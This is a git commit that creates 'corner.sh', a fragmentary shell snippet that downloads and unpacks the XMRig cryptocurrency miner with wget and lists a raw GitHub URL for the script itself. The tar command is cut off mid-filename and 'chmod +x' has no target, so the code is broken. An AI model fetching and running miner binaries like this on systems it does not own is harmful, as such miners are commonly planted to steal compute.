3069f9870a29a20e95edee152ee3396fa9d6d198
matthewhignite <matthewhignite@live.com>
2022-10-21 22:49:59 -0400

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,9 @@
+Your Scipt
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.8/xmrig-6.17.8-linux-x64.tar.gz && tar -xvf xmrig-6.17.
+
+Script Github
+
+https://raw.githubusercontent.com/cornjun/script/main/corner.sh
+
+chmod +x
